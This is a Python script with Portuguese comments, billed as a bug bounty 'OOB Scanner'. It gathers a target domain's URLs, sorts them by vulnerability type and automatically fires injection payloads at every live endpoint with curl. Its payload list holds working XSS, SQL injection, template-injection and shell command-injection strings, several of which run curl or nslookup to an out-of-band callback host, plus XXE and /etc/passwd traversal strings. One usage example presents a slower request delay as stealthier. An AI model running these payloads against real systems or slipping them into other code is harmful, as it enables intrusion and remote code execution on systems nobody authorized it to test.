#!/usr/bin/env python3
"""
OOB Scanner - Bug Bounty Automation Tool
Uso exclusivo em programas de Bug Bounty com escopo autorizado.

Dependências externas (instalar antes):
  go install github.com/lc/gau/v2/cmd/gau@latest
  go install github.com/jaeles-project/gospider@latest
  go install github.com/tomnomnom/waybackurls@latest
  go install github.com/tomnomnom/gf@latest
  go install github.com/projectdiscovery/httpx/cmd/httpx@latest
  go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest

Uso:
  python3 oob_scanner.py -d exemplo.com -o interactsh_id.oast.fun
  python3 oob_scanner.py -d exemplo.com -o SEU_ID.oast.fun --poll
  python3 oob_scanner.py -d exemplo.com -o SEU_ID.oast.fun --skip-recon
"""

import argparse
import subprocess
import os
import sys
import time
import json
import logging
import signal
import threading
import urllib.parse
from datetime import datetime
from pathlib import Path

# ─── Cores no terminal ────────────────────────────────────────────────────────
class C:
    RED    = "\033[91m"
    GREEN  = "\033[92m"
    YELLOW = "\033[93m"
    BLUE   = "\033[94m"
    CYAN   = "\033[96m"
    BOLD   = "\033[1m"
    DIM    = "\033[2m"
    RESET  = "\033[0m"

def banner():
    print(f"""{C.CYAN}{C.BOLD}
 ██████╗  ██████╗ ██████╗     ███████╗ ██████╗ █████╗ ███╗   ██╗
██╔═══██╗██╔═══██╗██╔══██╗    ██╔════╝██╔════╝██╔══██╗████╗  ██║
██║   ██║██║   ██║██████╔╝    ███████╗██║     ███████║██╔██╗ ██║
██║   ██║██║   ██║██╔══██╗    ╚════██║██║     ██╔══██║██║╚██╗██║
╚██████╔╝╚██████╔╝██████╔╝    ███████║╚██████╗██║  ██║██║ ╚████║
 ╚═════╝  ╚═════╝ ╚═════╝     ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝
{C.RESET}{C.DIM}  Bug Bounty OOB Automation  |  Apenas em alvos autorizados{C.RESET}
""")

# ─── Logging ──────────────────────────────────────────────────────────────────
def setup_logging(output_dir: Path):
    log_file = output_dir / "oob_scanner.log"
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s [%(levelname)s] %(message)s",
        handlers=[
            logging.FileHandler(log_file),
            logging.StreamHandler(sys.stdout),
        ],
    )

def log(msg, color=C.RESET, level="info"):
    getattr(logging, level)(f"{color}{msg}{C.RESET}")

# ─── Helpers ──────────────────────────────────────────────────────────────────
def run(cmd: str, output_file: Path | None = None, timeout: int = 300) -> str:
    """Executa comando shell e retorna stdout."""
    log(f"  $ {cmd}", C.DIM)
    try:
        result = subprocess.run(
            cmd, shell=True, capture_output=True, text=True, timeout=timeout
        )
        if output_file and result.stdout.strip():
            output_file.write_text(result.stdout)
        return result.stdout.strip()
    except subprocess.TimeoutExpired:
        log(f"Timeout em: {cmd}", C.YELLOW, "warning")
        return ""
    except Exception as e:
        log(f"Erro ao executar '{cmd}': {e}", C.RED, "error")
        return ""

def check_tool(tool: str) -> bool:
    result = subprocess.run(f"which {tool}", shell=True, capture_output=True)
    return result.returncode == 0

def check_dependencies():
    tools = ["gau", "gospider", "waybackurls", "gf", "httpx"]
    missing = [t for t in tools if not check_tool(t)]
    if missing:
        log(f"Ferramentas não encontradas: {', '.join(missing)}", C.RED, "error")
        log("Instale via Go conforme README.", C.YELLOW)
        sys.exit(1)
    log("Todas as dependências encontradas.", C.GREEN)

def ts() -> str:
    """Timestamp compacto para uso em payloads."""
    return datetime.utcnow().strftime("%Y%m%d%H%M%S")

def unique_id(category: str, param: str) -> str:
    """Gera ID único: categoria-timestamp-param (max 30 chars para caber no subdomínio)."""
    t = datetime.utcnow().strftime("%m%d%H%M%S")
    p = param[:8].replace("_", "").replace("-", "")
    return f"{category[:3]}-{t}-{p}"

# ─── Fase 1: Reconhecimento ───────────────────────────────────────────────────
def phase_recon(domain: str, out: Path) -> Path:
    log("\n━━━ FASE 1: Reconhecimento ━━━", C.BLUE + C.BOLD)
    raw_dir = out / "raw"
    raw_dir.mkdir(exist_ok=True)

    log("→ Coletando URLs com gau...", C.CYAN)
    run(f"gau --threads 5 {domain}", raw_dir / "gau.txt")

    log("→ Coletando URLs com gospider...", C.CYAN)
    run(
        f"gospider -s https://{domain} -d 3 -t 10 --quiet -o {raw_dir}/gospider_raw",
        timeout=180,
    )
    # gospider salva em subpastas; unifica
    gs_file = raw_dir / "gospider.txt"
    run(f"find {raw_dir}/gospider_raw -type f | xargs cat 2>/dev/null | grep -oP 'https?://[^\"\\s]+' | sort -u", gs_file)

    log("→ Coletando URLs com waybackurls...", C.CYAN)
    run(f"echo {domain} | waybackurls", raw_dir / "waybackurls.txt")

    # Unifica tudo
    all_urls = out / "all_urls.txt"
    run(
        f"cat {raw_dir}/*.txt 2>/dev/null | sort -u | grep -v '^$'",
        all_urls,
    )
    count = len(all_urls.read_text().splitlines()) if all_urls.exists() else 0
    log(f"  Total bruto: {count} URLs", C.GREEN)

    # httpx → filtra endpoints vivos
    log("→ Validando endpoints vivos com httpx...", C.CYAN)
    live_urls = out / "live_urls.txt"
    run(
        f"httpx -l {all_urls} -silent -threads 50 -timeout 10 -mc 200,301,302,403",
        live_urls,
    )
    live_count = len(live_urls.read_text().splitlines()) if live_urls.exists() else 0
    log(f"  Endpoints vivos: {live_count}", C.GREEN)

    return live_urls

def phase_gf(live_urls: Path, out: Path) -> dict[str, Path]:
    """Filtra endpoints por categoria com gf."""
    log("\n━━━ Filtrando com gf ━━━", C.BLUE + C.BOLD)
    gf_dir = out / "gf"
    gf_dir.mkdir(exist_ok=True)

    categories = {
        "xss":      "gf_xss.txt",
        "sqli":     "gf_sqli.txt",
        "ssrf":     "gf_ssrf.txt",
        "ssti":     "gf_ssti.txt",
        "redirect": "gf_redirect.txt",
        "rce":      "gf_rce.txt",
        "lfi":      "gf_lfi.txt",
        "idor":     "gf_idor.txt",
        "xxe":      "gf_xxe.txt",
    }

    files: dict[str, Path] = {}
    for cat, fname in categories.items():
        out_file = gf_dir / fname
        run(f"cat {live_urls} | gf {cat}", out_file)
        count = len(out_file.read_text().splitlines()) if out_file.exists() and out_file.stat().st_size > 0 else 0
        if count:
            log(f"  [{cat.upper():8}] {count} endpoints", C.GREEN)
            files[cat] = out_file
        else:
            log(f"  [{cat.upper():8}] nenhum encontrado", C.DIM)

    return files

# ─── Fase 2: Payloads OOB ────────────────────────────────────────────────────
PAYLOADS: dict[str, list[str]] = {
    "xss": [
        '"><img src="https://{OOB}/xss-{ID}" onerror=x>',
        "'><script src=https://{OOB}/xss-{ID}></script>",
        '"><svg onload=fetch(`https://{OOB}/xss-{ID}`)>',
        "javascript:fetch('https://{OOB}/xss-{ID}')",
        '"><iframe src="https://{OOB}/xss-{ID}">',
    ],
    "sqli": [
        "' AND LOAD_FILE('\\\\\\\\{OOB}\\\\sqli-{ID}')-- -",
        "1; EXEC master..xp_dirtree '\\\\{OOB}\\sqli-{ID}'-- -",
        "' UNION SELECT load_file('\\\\\\\\{OOB}\\\\sqli-{ID}')-- -",
        "'; copy (select '') to program 'nslookup {OOB}';-- -",
        "1 AND 1=UTL_HTTP.REQUEST('https://{OOB}/sqli-{ID}')-- -",
    ],
    "ssrf": [
        "https://{OOB}/ssrf-{ID}",
        "http://{OOB}/ssrf-{ID}",
        "dict://{OOB}:80/ssrf-{ID}",
        "ftp://{OOB}/ssrf-{ID}",
        "//[{OOB}]/ssrf-{ID}",
    ],
    "ssti": [
        "${{\"https://{OOB}/ssti-{ID}\".getClass()}}",
        "{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('curl https://{OOB}/ssti-{ID}')['read']()}}",
        "#{{\"https://{OOB}/ssti-{ID}\".class.forName('java.lang.Runtime')}}",
        "<%= `curl https://{OOB}/ssti-{ID}` %>",
        "${7*7}https://{OOB}/ssti-{ID}",
    ],
    "redirect": [
        "https://{OOB}/redirect-{ID}",
        "//https://{OOB}/redirect-{ID}",
        "/https://{OOB}/redirect-{ID}",
        "https:/%5C/{OOB}/redirect-{ID}",
        "@{OOB}/redirect-{ID}",
    ],
    "rce": [
        "; curl https://{OOB}/rce-{ID} #",
        "| curl https://{OOB}/rce-{ID}",
        "`curl https://{OOB}/rce-{ID}`",
        "$(curl https://{OOB}/rce-{ID})",
        "; nslookup {OOB} #",
    ],
    "lfi": [
        "//etc/passwd%00https://{OOB}/lfi-{ID}",
        "....//....//etc/passwd",  # path traversal clássico
        "https://{OOB}/lfi-{ID}",
    ],
    "xxe": [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "https://{OOB}/xxe-{ID}">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "//[{OOB}]/xxe-{ID}">]><foo>&xxe;</foo>',
    ],
    "idor": [
        # IDOR não é direto OOB mas pode haver SSRF embutido via ID manipulado
        "https://{OOB}/idor-{ID}",
    ],
}

# Cabeçalhos que também podem ser injetados
OOB_HEADERS = [
    "X-Forwarded-For",
    "X-Real-IP",
    "Referer",
    "User-Agent",
    "X-Forwarded-Host",
    "Host",
    "X-Custom-IP-Authorization",
    "X-Originating-IP",
    "True-Client-IP",
    "CF-Connecting-IP",
]

class PayloadLog:
    """Registra cada payload enviado com timestamp preciso."""

    def __init__(self, log_file: Path):
        self.log_file = log_file
        self.entries: list[dict] = []
        self._lock = threading.Lock()

    def record(self, uid: str, url: str, param: str, category: str, payload: str):
        entry = {
            "uid":       uid,
            "timestamp": datetime.utcnow().isoformat() + "Z",
            "unix_ts":   int(time.time()),
            "category":  category,
            "url":       url,
            "param":     param,
            "payload":   payload,
        }
        with self._lock:
            self.entries.append(entry)
            with open(self.log_file, "a") as f:
                f.write(json.dumps(entry) + "\n")
        return entry

    def find_by_uid(self, uid: str) -> dict | None:
        with self._lock:
            for e in self.entries:
                if e["uid"] == uid:
                    return e
        return None

def extract_params(url: str) -> list[tuple[str, str]]:
    """Retorna lista de (param_name, base_url_com_param)."""
    parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    results = []
    for param in qs:
        results.append((param, url))
    return results

def build_injected_url(url: str, param: str, payload: str) -> str:
    parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [payload]
    new_qs = urllib.parse.urlencode(qs, doseq=True)
    return urllib.parse.urlunparse(parsed._replace(query=new_qs))

def phase_inject(category_files: dict[str, Path], oob_host: str, out: Path, plog: PayloadLog, delay: float = 0.5):
    log("\n━━━ FASE 2: Injeção de Payloads OOB ━━━", C.BLUE + C.BOLD)
    results_dir = out / "injection_results"
    results_dir.mkdir(exist_ok=True)

    total_sent = 0

    for category, gf_file in category_files.items():
        if category not in PAYLOADS:
            continue

        urls = gf_file.read_text().splitlines() if gf_file.exists() else []
        if not urls:
            continue

        log(f"\n[{category.upper()}] Injetando em {len(urls)} endpoints...", C.YELLOW + C.BOLD)
        cat_results = results_dir / f"{category}_sent.jsonl"

        for url in urls:
            url = url.strip()
            if not url:
                continue

            params = extract_params(url)
            if not params:
                # Tenta injetar no path se não tiver parâmetros
                params = [("__path__", url)]

            for param, base_url in params:
                for payload_template in PAYLOADS[category]:
                    uid = unique_id(category, param)
                    payload = payload_template.replace("{OOB}", oob_host).replace("{ID}", uid)

                    if param == "__path__":
                        injected_url = base_url.rstrip("/") + "/" + urllib.parse.quote(payload, safe="")
                    else:
                        injected_url = build_injected_url(base_url, param, payload)

                    entry = plog.record(uid, base_url, param, category, payload)

                    # Envia requisição
                    curl_cmd = (
                        f"curl -sk --max-time 8 "
                        f"-H 'X-Forwarded-For: {oob_host}' "
                        f"-H 'Referer: https://{oob_host}/{uid}' "
                        f"'{injected_url}' -o /dev/null -w '%{{http_code}}'"
                    )
                    code = run(curl_cmd, timeout=15)

                    log(
                        f"  [{uid}] {param}= HTTP {code} → {base_url[:60]}",
                        C.GREEN if code in ("200", "301", "302") else C.DIM,
                    )

                    # Log também injeta nos headers para SSRF/SSRF-via-header
                    if category in ("ssrf", "rce", "lfi"):
                        for header in OOB_HEADERS[:4]:  # Limita para não spammar
                            h_uid = unique_id(f"{category}h", header)
                            h_payload = f"https://{oob_host}/{h_uid}"
                            plog.record(h_uid, base_url, header, category + "_header", h_payload)
                            hdr_cmd = (
                                f"curl -sk --max-time 8 "
                                f"-H '{header}: {h_payload}' "
                                f"'{base_url}' -o /dev/null -w '%{{http_code}}'"
                            )
                            run(hdr_cmd, timeout=15)

                    total_sent += 1
                    time.sleep(delay)

    log(f"\n  Total de payloads enviados: {total_sent}", C.GREEN + C.BOLD)
    return total_sent

# ─── Fase 3: Monitoramento interactsh ────────────────────────────────────────
def phase_monitor(oob_host: str, plog: PayloadLog, out: Path, duration: int = 300):
    """
    Monitora interações via interactsh-client poll.
    Cruza o UID do subpath com o log de payloads.
    """
    log("\n━━━ FASE 3: Monitorando OOB callbacks ━━━", C.BLUE + C.BOLD)
    log(f"  Host interactsh: {oob_host}", C.CYAN)
    log(f"  Duração: {duration}s | Ctrl+C para parar antes", C.DIM)

    hits_file = out / "oob_hits.jsonl"
    hits_summary = out / "oob_hits_summary.txt"

    if not check_tool("interactsh-client"):
        log("interactsh-client não encontrado. Monitoramento manual necessário.", C.YELLOW, "warning")
        log(f"  Execute: interactsh-client -server {oob_host} -json", C.DIM)
        _manual_poll_hint(oob_host, plog, out)
        return

    log("  Iniciando poll com interactsh-client...", C.CYAN)

    cmd = f"interactsh-client -server {oob_host} -json -poll-interval 5"
    proc = subprocess.Popen(
        cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
    )

    start = time.time()
    hits = []

    try:
        while time.time() - start < duration:
            line = proc.stdout.readline()
            if not line:
                time.sleep(1)
                continue
            line = line.strip()
            if not line:
                continue

            try:
                data = json.loads(line)
            except json.JSONDecodeError:
                continue

            # Extrai UID do full-id / unique-id do interactsh
            raw_id = data.get("full-id", data.get("unique-id", ""))
            protocol = data.get("protocol", "unknown")
            remote_addr = data.get("remote-address", "?")
            received_at = datetime.utcnow().isoformat() + "Z"

            log(f"\n{'!'*60}", C.RED + C.BOLD)
            log(f"  🎯 OOB HIT DETECTADO!", C.RED + C.BOLD)
            log(f"  Protocolo : {protocol}", C.YELLOW)
            log(f"  Remote IP : {remote_addr}", C.YELLOW)
            log(f"  ID        : {raw_id}", C.YELLOW)
            log(f"  Horário   : {received_at}", C.YELLOW)

            # Tenta cruzar com payload log
            matched = None
            for uid_candidate in plog.entries:
                if uid_candidate["uid"] in raw_id:
                    matched = uid_candidate
                    break

            if matched:
                log(f"\n  ✅ Payload identificado!", C.GREEN + C.BOLD)
                log(f"  Categoria : {matched['category']}", C.GREEN)
                log(f"  URL       : {matched['url']}", C.GREEN)
                log(f"  Parâmetro : {matched['param']}", C.GREEN)
                log(f"  Payload   : {matched['payload'][:80]}...", C.GREEN)
                delay_s = int(time.time()) - matched["unix_ts"]
                log(f"  Delay     : {delay_s}s após envio", C.GREEN)
            else:
                log("  ⚠️  UID não encontrado no payload log (verifique manualmente)", C.YELLOW, "warning")

            hit = {
                "received_at":  received_at,
                "protocol":     protocol,
                "remote_addr":  remote_addr,
                "raw_id":       raw_id,
                "matched_entry": matched,
            }
            hits.append(hit)
            with open(hits_file, "a") as f:
                f.write(json.dumps(hit) + "\n")

            log(f"{'!'*60}\n", C.RED + C.BOLD)

    except KeyboardInterrupt:
        log("\nMonitoramento encerrado pelo usuário.", C.YELLOW)
    finally:
        proc.terminate()

    # Sumário final
    _write_summary(hits, plog, hits_summary)

def _manual_poll_hint(oob_host: str, plog: PayloadLog, out: Path):
    """Instruções para poll manual."""
    log("\n  === POLL MANUAL ===", C.YELLOW + C.BOLD)
    log(f"  1. Execute em outro terminal:", C.CYAN)
    log(f"     interactsh-client -server {oob_host} -json | tee {out}/interactsh_raw.jsonl", C.DIM)
    log(f"  2. Quando ver um hit, copie o 'unique-id' e busque em:", C.CYAN)
    log(f"     {out}/payload_log.jsonl", C.DIM)
    log(f"  3. Use: grep <uid> {out}/payload_log.jsonl", C.DIM)

def _write_summary(hits: list, plog: PayloadLog, summary_file: Path):
    lines = [
        "=" * 60,
        "OOB SCANNER - SUMÁRIO DE HITS",
        f"Gerado em: {datetime.utcnow().isoformat()}Z",
        "=" * 60,
        f"Total de payloads enviados : {len(plog.entries)}",
        f"Total de OOB hits          : {len(hits)}",
        "",
    ]
    if hits:
        lines.append("─ HITS CONFIRMADOS ─")
        for i, h in enumerate(hits, 1):
            lines.append(f"\n[Hit #{i}]")
            lines.append(f"  Protocolo : {h['protocol']}")
            lines.append(f"  Remote    : {h['remote_addr']}")
            lines.append(f"  Horário   : {h['received_at']}")
            if h.get("matched_entry"):
                m = h["matched_entry"]
                lines.append(f"  Categoria : {m['category']}")
                lines.append(f"  URL       : {m['url']}")
                lines.append(f"  Parâmetro : {m['param']}")
                lines.append(f"  Payload   : {m['payload']}")
    else:
        lines.append("Nenhum hit OOB registrado.")

    summary_file.write_text("\n".join(lines))
    log(f"\n  Sumário salvo em: {summary_file}", C.GREEN)

# ─── CLI ──────────────────────────────────────────────────────────────────────
def parse_args():
    p = argparse.ArgumentParser(
        description="OOB Scanner - Bug Bounty Automation",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Exemplos:
  # Execução completa (recon + inject + monitor)
  python3 oob_scanner.py -d alvo.com -o abc123.oast.fun

  # Só injeção + monitor (pula recon, usa urls já coletadas)
  python3 oob_scanner.py -d alvo.com -o abc123.oast.fun --skip-recon

  # Monitor por 10 minutos
  python3 oob_scanner.py -d alvo.com -o abc123.oast.fun --monitor-time 600

  # Delay maior entre requisições (mais furtivo)
  python3 oob_scanner.py -d alvo.com -o abc123.oast.fun --delay 2.0

  # Só categorias específicas
  python3 oob_scanner.py -d alvo.com -o abc123.oast.fun --categories xss ssrf rce
        """,
    )
    p.add_argument("-d", "--domain",        required=True,  help="Domínio alvo (ex: exemplo.com)")
    p.add_argument("-o", "--oob",           required=True,  help="Host interactsh (ex: abc.oast.fun)")
    p.add_argument("--skip-recon",          action="store_true", help="Pula fase de reconhecimento")
    p.add_argument("--skip-inject",         action="store_true", help="Pula fase de injeção")
    p.add_argument("--poll",                action="store_true", help="Só monitora (sem recon/inject)")
    p.add_argument("--monitor-time",        type=int, default=300, metavar="SECS",
                   help="Duração do monitoramento em segundos (default: 300)")
    p.add_argument("--delay",              type=float, default=0.3, metavar="SECS",
                   help="Delay entre requisições (default: 0.3s)")
    p.add_argument("--output-dir",         default="oob_results", metavar="DIR",
                   help="Diretório de saída (default: oob_results/)")
    p.add_argument("--categories",         nargs="+", metavar="CAT",
                   choices=list(PAYLOADS.keys()), help="Categorias a injetar")
    p.add_argument("--threads",            type=int, default=1, help="Threads paralelas (experimental)")
    return p.parse_args()

# ─── Main ─────────────────────────────────────────────────────────────────────
def main():
    banner()
    args = parse_args()

    # Output dir
    out = Path(args.output_dir) / args.domain.replace(".", "_")
    out.mkdir(parents=True, exist_ok=True)
    setup_logging(out)

    log(f"Alvo    : {args.domain}", C.CYAN + C.BOLD)
    log(f"OOB Host: {args.oob}",    C.CYAN + C.BOLD)
    log(f"Output  : {out}",         C.CYAN + C.BOLD)

    # Payload logger
    plog = PayloadLog(out / "payload_log.jsonl")

    # ── Só poll ──────────────────────────────────────────────────────────────
    if args.poll:
        phase_monitor(args.oob, plog, out, args.monitor_time)
        return

    check_dependencies()

    # ── Fase 1: Recon ────────────────────────────────────────────────────────
    live_urls_file = out / "live_urls.txt"
    if not args.skip_recon:
        live_urls_file = phase_recon(args.domain, out)
    else:
        if not live_urls_file.exists():
            log("live_urls.txt não encontrado. Execute sem --skip-recon primeiro.", C.RED, "error")
            sys.exit(1)
        log(f"Recon pulado. Usando: {live_urls_file}", C.YELLOW)

    # ── GF ───────────────────────────────────────────────────────────────────
    category_files = phase_gf(live_urls_file, out)

    # Filtra categorias se especificado
    if args.categories:
        category_files = {k: v for k, v in category_files.items() if k in args.categories}

    # ── Fase 2: Injeção ──────────────────────────────────────────────────────
    if not args.skip_inject:
        phase_inject(category_files, args.oob, out, plog, delay=args.delay)
    else:
        log("Injeção pulada (--skip-inject).", C.YELLOW)

    # ── Fase 3: Monitor ──────────────────────────────────────────────────────
    phase_monitor(args.oob, plog, out, args.monitor_time)

    log(f"\n{'='*60}", C.GREEN)
    log(f"  Scan finalizado. Resultados em: {out}/", C.GREEN + C.BOLD)
    log(f"{'='*60}\n", C.GREEN)


if __name__ == "__main__":
    signal.signal(signal.SIGINT, lambda s, f: (print("\n  Interrompido."), sys.exit(0)))
    main()
